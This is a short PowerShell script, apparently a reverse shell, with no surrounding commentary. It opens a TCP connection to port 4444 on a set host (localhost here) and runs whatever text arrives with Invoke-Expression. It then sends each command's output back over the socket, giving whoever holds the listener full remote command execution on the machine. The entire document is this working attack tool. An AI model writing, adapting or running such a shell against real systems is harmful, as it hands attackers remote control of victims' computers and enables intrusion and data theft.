$tcpClient = New-Object Net.Sockets.TCPClient("127.0.0.1", 4444)
$stream = $tcpClient.GetStream()
$bufferSize = 4096

while ($true) {
    $buffer = New-Object byte[] $bufferSize
    $bytesRead = $stream.Read($buffer, 0, $buffer.Length)

    if ($bytesRead -eq 0) {
        break
    }

    $receivedData = [Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
    $commandOutput = Invoke-Expression -Command $receivedData 2>&1
    $encodedOutput = [Text.Encoding]::ASCII.GetBytes($commandOutput)

    $stream.Write($encodedOutput, 0, $encodedOutput.Length)
}

$tcpClient.Close()
